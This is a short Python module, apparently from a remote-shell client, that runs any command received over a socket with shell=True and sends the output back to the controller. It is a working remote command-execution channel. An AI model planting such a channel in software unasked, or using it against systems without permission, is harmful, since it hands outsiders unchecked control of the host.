import subprocess
from colorama import Style, Fore

from Client.client import send_shell_results


def execute(s, args):
    print(Fore.BLUE + "Executing command: " + Style.RESET_ALL + args[1])
    output = subprocess.Popen(args[1], shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    results = output.stdout.read().decode('utf-8')
    errors = output.stderr.read().decode('utf-8')
    print(Fore.BLUE + "Execution Results: " + Style.RESET_ALL + "{}".format((results if results else errors).strip()))
    send_shell_results(s, results if results else errors)